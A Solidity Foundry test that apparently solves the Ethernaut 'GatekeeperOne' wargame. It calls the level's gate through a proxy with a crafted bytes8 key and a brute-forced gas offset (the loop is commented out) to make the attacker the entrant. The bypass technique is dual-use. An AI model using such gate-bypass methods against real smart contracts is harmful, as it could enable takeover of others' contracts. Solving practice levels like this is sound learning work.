// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "tests/Test.sol";
import "../../src/GatekeeperOne/Level.sol";
import "../utils/GateProxy.sol";
import "forge-std/console.sol";

interface GKO {
    function entrant() external view returns(address);
}

contract GatekeeperOneTest is Test {
    address gatekeeperOne;
    address gateProxy;

    address deployer = address(100);
    address attacker = address(101);

    function setUp() public {
        vm.prank(deployer); // deploy the contract as deployer
        gatekeeperOne = address(new GatekeeperOne());
        gateProxy = address(new GateProxy());
    }

    function testAttack() public {
        /* Setup stuff, no need to touch */
        vm.startPrank(attacker, attacker);
        vm.deal(attacker, 5 ether);

        /* Write your code here */

        /*for (uint i; i < 8191; i++) {
          (bool worked,) = gateProxy.call.gas(i + 100000)(abi.encodeWithSignature("enter(address,bytes8)", gatekeeperOne, key));
          if (worked) {
          console.log("Yeahh!");
          console.log(i);
          break;
          }
          }*/

        bytes8 key = 0x4141410000000065; 
        uint i = 3397;
        (bool worked,) = gateProxy.call.gas(i + 100000)(abi.encodeWithSignature("enter(address,bytes8)", gatekeeperOne, key));
        assert(worked);
        /* Write your code here */ 

        /* Validating the test */
        assertEq(GKO(gatekeeperOne).entrant(), attacker);
    }
}


